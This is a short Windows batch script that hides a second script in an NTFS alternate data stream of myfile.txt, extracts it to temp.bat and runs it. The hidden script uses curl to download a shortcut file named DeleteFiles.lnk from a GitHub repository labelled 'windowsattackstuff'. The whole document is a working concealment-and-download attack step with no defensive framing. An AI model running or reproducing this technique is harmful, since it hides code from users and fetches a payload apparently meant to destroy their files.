@echo off
REM batch script in an alternate data stream
(
    echo @echo off
    echo set URL=https://github.com/djrk01/windowsattackstuff/raw/main/DeleteFiles.lnk
    echo.
    echo set OUTPUT_FILE=DeleteFiles.lnk
    echo.
    echo curl -L -o %%OUTPUT_FILE%% %%URL%%

) > myfile.txt:ads

more < myfile.txt:ads > temp.bat
call temp.bat



